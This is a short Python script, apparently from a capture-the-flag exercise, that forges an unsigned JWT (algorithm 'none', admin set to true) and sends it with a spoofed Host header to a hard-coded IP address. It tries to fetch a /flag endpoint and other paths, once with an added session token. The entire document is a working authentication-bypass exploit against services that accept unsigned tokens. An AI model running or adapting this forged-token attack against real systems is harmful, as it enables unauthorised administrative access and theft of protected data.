#!/usr/bin/env python3
import base64, json, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

SS = "77.74.147.54"
HOST = "secret-server.hkn"

h1 = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
p1 = b64url(json.dumps({"admin":True,"timestamp":1300000000}, separators=(',',':')).encode())
JWT_FORGED = f"{h1}.{p1}."

for path in ["/flag", "/", "/keycheck"]:
    print(f"\n### GET {path} paa .54 med forged admin:true JWT ###")
    r = requests.get(f"http://{SS}{path}", headers={"Host": HOST, "JWT": JWT_FORGED}, timeout=5)
    print(f"  -> {r.status_code}: {r.text[:300]}")

# Proev ogsaa med Session-Token samtidig
print("\n### GET /flag med BAADE forged JWT og Session-Token ###")
r = requests.get(f"http://{SS}/flag", headers={
    "Host": HOST, "JWT": JWT_FORGED, "Session-Token": "very-good-session-token"
}, timeout=5)
print(f"  -> {r.status_code}: {r.text[:300]}")
